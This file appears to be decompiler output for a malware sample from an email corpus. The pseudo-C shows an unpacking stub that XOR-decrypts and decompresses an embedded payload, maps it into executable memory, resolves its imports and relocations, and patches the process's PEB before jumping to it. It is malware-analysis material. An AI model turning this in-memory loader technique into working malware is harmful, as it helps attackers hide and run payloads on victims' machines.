// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1213/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401020(Eq_25 dwArg04, Eq_25 dwArg08, int32 dwArg0C)
{
	globals->dw4092AC = 0x00000000;
	while (globals->dw4092AC <u dwArg0C)
	{
		dwArg04[globals->dw4092AC] = dwArg08[globals->dw4092AC];
		globals->dw4092AC = globals->dw4092AC + 0x00000001;
	}
	return;
}

void fn004010B0(word32 ebx, word32 esi, word32 edi, Eq_110 * fs, word32 dwArg04)
{
	Eq_25 eax_18 = GetModuleHandleA(0x00000000);
	if ((dwArg04 & 0x0000FFFF) != 0x00000000)
		globals->dw4092C4 = 0x00000000;
	else
		globals->dw4092C4 = 0x00000001;
	if (dwArg04 == 0x00000000)
		globals->dw4092C4 = 0x00000000;
	if (globals->dw4092C4 != 0x00000000)
		globals->t4092B4 = dwArg04;
	fp->dwFFFFFF60 = 0x004091EC;
	code * eax_42 = fn00401270(LoadLibraryA(0x004091F8), 0x00000000);
	fp->dwFFFFFF60 = &fp->dwFFFFFF60;
	eax_42();
	if (eax_42 != null)
		return;
	else
	{
		up32 ecx_100 = globals->dw405000;
		word32 eax_103 = globals->dw405004;
		up32 dwLoc08_105 = 0x00000000;
		while (dwLoc08_105 <u ecx_100)
		{
			(dwLoc08_105 + 0x00405000)->dw0008 = (word32) (int64) (dwLoc08_105 + 0x00405000)->dw0008 ^ 0x380B5A5F;
			dwLoc08_105 = dwLoc08_105 + 0x00000008;
		}
		globals->dw4092C0 = fn004018B0(eax_103);
		fn00401A70(0x00405008, globals->dw4092C0, ecx_100);
		globals->dw4092B0 = edi;
		globals->dw4092A8 = esi;
		globals->dw4092BC = ebx;
		globals->ptr4092C8 = fs->ptr0018;
		globals->dw4092B8 = fp - 0x00000004;
		if (globals->dw4092C4 != 0x00000000)
			fn004018E0(0x00401237 - dwArg04, dwArg04);
		else
			fn004018E0(0x00401237 - eax_18, eax_18);
		word32 ecx_158 = globals->dw4092C0;
		fn004012A0(fp - 0x00000004, ecx_158);
		Mem154[0x004092CC:word32]();
		return;
	}
}

word32 fn00401270(Eq_25 dwArg04, word32 dwArg08)
{
	GetCommandLineA();
	return GetProcAddress(dwArg04, dwArg08);
}

void fn004012A0(word32 ebp, word32 dwArg04)
{
	lstrcpyA(&fp->dwFFFFFF38, 0x00409210);
	word32 eax_23 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	Eq_187 * dwLoc2C_167 = &eax_23->w0014 + (word32) eax_23->w0014;
	Eq_25 eax_40 = VirtualAlloc(0x00000000, eax_23->t0050, 0x00003000, 0x00000040);
	if (eax_40 == 0x00000000)
		;
	else
	{
		Mem130[fp - 0x000000C8:word32] = Mem0[dwArg04 + 0x0000003C:word32] + 0x00000138 + (word32) Mem0[eax_23 + 0x00000006:word16] *s 0x00000028;
		Mem133[fp - 0x000000CC:word32] = dwArg04;
		fn00401020(eax_40, 0x00003000, 0x00000040);
		fp->dwFFFFFFE4 = 0x00409224;
		fp->dwFFFFFFE4 = 0x00409234;
		Mem146[fp - 0x000000CC:word32] = GetModuleHandleA(0x00003000);
		code * eax_147 = GetProcAddress((Eq_1098 *) 0x00003000, 0x00000040);
		fp->dwFFFFFFE4 = 0x00409244;
		fp->dwFFFFFFE4 = 0x00409258;
		Mem157[fp - 0x000000CC:word32] = GetModuleHandleA((Eq_1098 *) 0x00003000);
		code * eax_158 = GetProcAddress((Eq_1098 *) 0x00003000, 0x00000040);
		up32 dwLoc10_161 = 0x00000000;
		while (dwLoc10_161 <u (word32) eax_23->w0006)
		{
			if (dwLoc2C_167->dw0014 != 0x00000000 && dwLoc2C_167->dw0010 != 0x00000000)
			{
				word32 eax_201 = dwLoc2C_167->dw0010 - 0x00000001 + eax_23->t003C;
				fn00401020(eax_40 + Mem157[dwLoc2C_167 + 0x0000000C:word32], dwArg04 + Mem157[dwLoc2C_167 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_201) % eax_23->t003C, eax_201) /u eax_23->t003C *s eax_23->t003C);
			}
			dwLoc2C_167 = dwLoc2C_167 + 1;
			dwLoc10_161 = dwLoc10_161 + 0x00000001;
		}
		word32 ecx_229 = eax_40 + Mem157[eax_40 + 0x0000003C:word32];
		word32 eax_235 = Mem157[ecx_229 + 0x00000050:word32];
		fp->dwFFFFFFE4 = 0x00000004;
		eax_158();
		if (eax_235 == 0x00000000)
			;
		else
		{
			code * eax_261 = fn00401270(GetModuleHandleA(0x00409274), 0x00409268);
			word32 dwLocC0_268 = eax_40 + Mem241[ecx_229 + 0x00000080:word32];
			while (dwLocC0_268->dw0010 != 0x00000000)
			{
				Eq_356 * dwLoc38_296;
				Eq_357 * dwLoc28_295;
				Eq_25 eax_289 = LoadLibraryA(eax_40 + Mem241[dwLocC0_268 + 0x0000000C:word32]);
				if (dwLocC0_268->dw0000 != 0x00000000)
				{
					dwLoc28_295 = eax_40 + Mem241[dwLocC0_268 + 0x00000000:word32];
					dwLoc38_296 = eax_40 + Mem241[dwLocC0_268 + 0x00000010:word32];
				}
				else
				{
					dwLoc28_295 = eax_40 + Mem241[dwLocC0_268 + 0x00000010:word32];
					dwLoc38_296 = eax_40 + Mem241[dwLocC0_268 + 0x00000000:word32];
				}
				if (dwLocC0_268->dw0010 != 0x00000000 && dwLocC0_268->dw0000 != 0x00000000)
				{
					fp->dwFFFFFFE4 = 0x00000001;
					goto l004014E0;
				}
l004014E0:
				while (dwLoc28_295->ptr0000 != null)
				{
					if ((dwLoc28_295->ptr0000 & 0x80000000) != 0x00000000)
						dwLoc28_295->ptr0000 = fn00401270(eax_289, dwLoc28_295->ptr0000 & 0x7FFFFFFF);
					else
						Mem376[dwLoc28_295 + 0x00000000:word32] = fn00401270(eax_289, Mem241[dwLoc28_295 + 0x00000000:word32] + 0x00000002 + eax_40);
					if (dwLoc28_295->ptr0000 == null)
						goto l00401838;
					if (0x00000000 != 0x00000000)
						dwLoc38_296->ptr0000 = dwLoc28_295->ptr0000;
					dwLoc28_295 = dwLoc28_295 + 1;
					dwLoc38_296 = dwLoc38_296 + 1;
				}
				dwLocC0_268 = dwLocC0_268 + 1;
			}
			if (globals->dw4092C4 != 0x00000000)
			{
				word32 edx_680 = Mem241[0x004092B4:word32] - Mem241[ecx_229 + 0x00000034:word32];
				if (Mem241[ecx_229 + 0x000000A4:word32] != 0x00000000)
				{
					word32 dwLoc24_689 = eax_40 + Mem241[ecx_229 + 0x000000A0:word32];
					while (dwLoc24_689->dw0004 != 0x00000000)
					{
						uint32 edx_704 = dwLoc24_689->dw0004 - 0x00000008 >>u 0x00000001;
						word16 * eax_707[] = &dwLoc24_689->a0008[0];
						uint32 dwLoc10_710 = 0x00000000;
						while (dwLoc10_710 <u edx_704)
						{
							if ((word32) eax_707[dwLoc10_710] >> 0x0000000C == 0x00000003)
								(eax_40 + Mem241[dwLoc24_689 + 0x00000000:word32])[(word32) eax_707[dwLoc10_710] & 0x00000FFF] = (eax_40 + Mem241[dwLoc24_689 + 0x00000000:word32])[(word32) eax_707[dwLoc10_710] & 0x00000FFF] + edx_680;
							dwLoc10_710 = dwLoc10_710 + 0x00000001;
						}
						dwLoc24_689 = dwLoc24_689 + Mem241[dwLoc24_689 + 0x00000004:word32];
					}
				}
			}
			Eq_25 eax_435;
			word32 esp_440;
			code * eax_422 = GetProcAddress(GetModuleHandleA(0x00409294), 0x00409284);
			if (globals->dw4092C4 != 0x00000000)
			{
				Eq_25 edx_645 = globals->t4092B4;
				Mem647[fp - 0x000000E0:word32] = edx_645;
				eax_435 = eax_235;
				esp_440 = fp - 0x000000F4;
				eax_422();
				globals->t4092A4 = eax_235;
			}
			else
			{
				word32 edx_662 = Mem241[ecx_229 + 0x00000034:word32];
				Mem664[fp - 0x000000E0:word32] = edx_662;
				eax_435 = eax_235;
				esp_440 = fp - 0x000000F4;
				eax_422();
				globals->t4092A4 = eax_235;
			}
			if (globals->t4092A4 == 0x00000000)
			{
				word32 esp_513;
				if (globals->dw4092C4 != 0x00000000)
				{
					esp_513 = fp - 0x000000F8;
					eax_147();
					if (eax_435 == 0x00000000)
					{
						esp_513 = fp - 0x00000104;
						eax_261();
						if (eax_435 == 0x00000000)
							;
						else
						{
l004016FC:
l00401728:
							if (globals->dw4092C4 != 0x00000000)
							{
								Eq_25 ecx_557 = globals->t4092B4;
								Eq_712 * esp_558 = esp_513 - 0x00000004;
								esp_558->t0000 = ecx_557;
								Mem561[esp_558 - 0x00000004:word32] = 0x00000000;
								Mem563[esp_558 - 0x00000008:word32] = 0x00000000;
								Mem565[esp_558 - 0x0000000C:word32] = 0x00000000;
								Mem567[esp_558 - 0x00000010:word32] = 0x00000022;
								esp_558->t0000 = eax_235;
								esp_440 = esp_558 - 0x00000014;
								eax_422();
								globals->t4092A4 = eax_435;
							}
							else
							{
								word32 ecx_573 = Mem241[ecx_229 + 0x00000034:word32];
								Eq_681 * esp_574 = esp_513 - 0x00000004;
								esp_574->t0000 = ecx_573;
								Mem577[esp_574 - 0x00000004:word32] = 0x00000000;
								Mem579[esp_574 - 0x00000008:word32] = 0x00000000;
								Mem581[esp_574 - 0x0000000C:word32] = 0x00000000;
								Mem583[esp_574 - 0x00000010:word32] = 0x00000022;
								esp_574->t0000 = eax_235;
								esp_440 = esp_574 - 0x00000014;
								eax_422();
								globals->t4092A4 = ecx_229;
							}
							if (globals->t4092A4 == 0x00000000)
								if (globals->dw4092C4 == 0x00000000)
								{
									Eq_787 * esp_528 = esp_440 - 0x00000004;
									esp_528->t0000.u0 = 0x00000040;
									esp_528->t0000.u0 = 0x00003000;
									Mem535[esp_528 - 0x00000008:word32] = Mem531[ecx_229 + 0x00000050:word32];
									Mem539[esp_528 - 0x0000000C:word32] = Mem535[ecx_229 + 0x00000034:word32];
									globals->t4092A4 = VirtualAlloc(esp_528->t0000, esp_528->t0000, esp_528->t0000, esp_528->t0000);
									esp_440 = &esp_528->t0000;
								}
								else
								{
									Eq_748 * esp_543 = esp_440 - 0x00000004;
									esp_543->t0000.u0 = 0x00000040;
									esp_543->t0000.u0 = 0x00003000;
									Mem550[esp_543 - 0x00000008:word32] = Mem546[ecx_229 + 0x00000050:word32];
									Mem553[esp_543 - 0x0000000C:word32] = Mem550[0x004092B4:word32];
									globals->t4092A4 = VirtualAlloc(esp_543->t0000, esp_543->t0000, esp_543->t0000, esp_543->t0000);
									esp_440 = &esp_543->t0000;
								}
l004017BC:
							Eq_573 * esp_454 = esp_440 - 0x00000004;
							esp_454->t0000 = eax_235;
							CloseHandle(esp_454->t0000);
							Mem461[esp_454 + 0x00000000:word32] = Mem455[ecx_229 + 0x00000050:word32];
							esp_454->t0000 = eax_40;
							esp_454->t0000 = globals->t4092A4;
							fn00401020(dwArg00, dwArg04, dwArg08);
							if (globals->dw4092C4 != 0x00000000)
							{
								Mem488[esp_454 + 0x00000000:word32] = Mem467[0x004092A4:word32] + Mem467[ecx_229 + 0x00000028:word32];
								esp_454->t0000 = globals->t4092B4;
								fn00401840(dwArg00, dwArg04);
							}
							else
							{
								esp_454->t0000 = globals->t4092A4;
								fn00401A40(dwArg00);
							}
							Mem478[0x004092CC:word32] = Mem467[0x004092A4:word32] + Mem467[ecx_229 + 0x00000028:word32];
							Mem481[ecx_229 + 0x00000028:word32] = Mem478[0x004092CC:word32];
						}
					}
					else
						goto l004016FC;
				}
				else
				{
					eax_435 = ecx_229;
					esp_513 = fp - 0x000000F8;
					eax_147();
					if (ecx_229 == 0x00000000)
					{
						eax_435 = Mem241[ecx_229 + 0x00000034:word32];
						esp_513 = fp - 0x00000104;
						eax_261();
						if (eax_435 == 0x00000000)
							;
						else
							goto l00401728;
					}
					else
						goto l00401728;
				}
			}
			else
				goto l004017BC;
		}
	}
l00401838:
	return;
}

void fn00401840(Eq_25 dwArg04, Eq_25 dwArg08)
{
	Eq_827 * ecx_14 = globals->ptr4092C8->ptr0030->ptr000C->ptr000C;
	Eq_827 * dwLoc0C_15 = ecx_14;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc0C_15 == null)
			goto l004018AC;
		if (dwLoc0C_15->dw0018 == dwArg04)
		{
			dwLoc0C_15->dw001C = dwArg08;
			goto l004018AC;
		}
		Eq_827 * eax_53 = dwLoc0C_15->ptr0000;
		dwLoc0C_15 = eax_53;
		if (eax_53 == ecx_14)
			goto l004018AC;
	}
l004018AC:
	return;
}

word32 fn004018B0(word32 dwArg04)
{
	return VirtualAlloc(0x00000000, dwArg04, 0x00003000, 0x00000004);
}

void fn004018E0(word32 dwArg04, Eq_25 dwArg08)
{
fn004018E0_entry:
l004018E0:
	Eq_25 dwLoc24_13
	branch globals->dw4092C4 == 0x00000000 l004018FA
l004018F0:
	dwLoc24_13 = globals->t4092B4;
	goto l00401900
l004018FA:
	dwLoc24_13 = dwArg08;
l00401900:
	word32 ecx_18 = dwLoc24_13 + Mem0[dwLoc24_13 + 0x0000003C:word32]
	globals->t4092A4 = VirtualAlloc(0x00000000, ecx_18->t0050, 0x00003000, 0x00000040);
	branch globals->t4092A4 != 0x00000000 l00401940
l00401936:
	goto l00401A32
l00401940:
	fp->tFFFFFFD4 = ecx_18->t0050;
	fp->tFFFFFFD4 = dwLoc24_13;
	fn00401020(globals->t4092A4, 0x00003000, 0x00000040)
	word32 edx_52 = globals->t4092A4 - dwLoc24_13
	branch ecx_18->dw00A4 == 0x00000000 l00401A27
l00401976:
	Eq_918 * dwLoc0C_146 = dwLoc24_13 + Mem46[ecx_18 + 0x000000A0:word32]
l00401985:
	branch dwLoc0C_146->dw0004 == 0x00000000 l00401A27
l00401992:
	uint32 edx_94 = dwLoc0C_146->dw0004 - 0x00000008 >>u 0x00000001
	word16 * eax_97[] = &dwLoc0C_146->a0008[0]
	uint32 dwLoc08_100 = 0x00000000
	goto l004019BB
l004019B2:
	dwLoc08_100 = dwLoc08_100 + 0x00000001;
l004019BB:
	branch dwLoc08_100 >=u edx_94 l00401A16
l004019C3:
	branch (word32) eax_97[dwLoc08_100] >> 0x0000000C != 0x00000003 l00401A14
l004019D5:
	(Mem46[0x004092A4:word32] + Mem46[dwLoc0C_146 + 0x00000000:word32])[(word32) eax_97[dwLoc08_100] & 0x00000FFF] = (Mem46[0x004092A4:word32] + Mem46[dwLoc0C_146 + 0x00000000:word32])[(word32) eax_97[dwLoc08_100] & 0x00000FFF] + edx_52;
l00401A14:
	goto l004019B2
l00401A16:
	dwLoc0C_146 = dwLoc0C_146 + Mem46[dwLoc0C_146 + 0x00000004:word32];
	goto l00401985
l00401A27:
l00401A32:
	return
fn004018E0_exit:
}

void fn00401A40(Eq_25 dwArg04)
{
	Eq_112 * edx_7 = globals->ptr4092C8;
	edx_7->ptr0030->dw0008 = dwArg04;
	return;
}

void fn00401A70(ptr32 dwArg04, word32 dwArg08, up32 dwArg0C)
{
	up32 dwLoc0C_112 = 0x00000001;
	byte cl_12 = *dwArg04;
	word32 dwLoc18_118 = 0x00000000;
	do
	{
		up32 ecx_34 = dwLoc0C_112 + 0x00000001;
		byte al_31 = dwArg04[dwLoc0C_112];
		dwLoc0C_112 = ecx_34;
		if ((word32) al_31 != (word32) cl_12)
		{
			dwArg08[dwLoc18_118] = al_31;
			dwLoc18_118 = dwLoc18_118 + 0x00000001;
		}
		else if ((word32) dwArg04[ecx_34] == 0x00000000)
		{
			dwArg08[dwLoc18_118] = cl_12;
			dwLoc18_118 = dwLoc18_118 + 0x00000001;
			dwLoc0C_112 = ecx_34 + 0x00000001;
		}
		else
		{
			word32 eax_98 = fn00401B70(fp - 0x00000010, dwArg04 + ecx_34) + ecx_34;
			dwLoc0C_112 = fn00401B70(fp - 0x00000020, dwArg04 + eax_98) + eax_98;
			up32 dwLoc1C_113 = 0x00000000;
			while (dwLoc1C_113 <u dwLoc10)
			{
				dwArg08[dwLoc18_118] = dwArg08[dwLoc18_118 - dwLoc20];
				dwLoc18_118 = dwLoc18_118 + 0x00000001;
				dwLoc1C_113 = dwLoc1C_113 + 0x00000001;
			}
		}
	} while (dwLoc0C_112 <u dwArg0C);
	return;
}

word32 fn00401B70(word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc08_12 = 0x00000000;
	word32 dwLoc10_13 = 0x00000000;
	do
	{
		word32 ecx_16 = (word32) dwArg08->b0000;
		word32 ecx_26 = ecx_16 & 0x0000007F | dwLoc08_12 << 0x00000007;
		word32 edx_29 = dwLoc10_13 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc08_12 = ecx_26;
		dwLoc10_13 = edx_29;
	} while ((ecx_16 & 0x00000080) != 0x00000000);
	*dwArg04 = ecx_26;
	return edx_29;
}

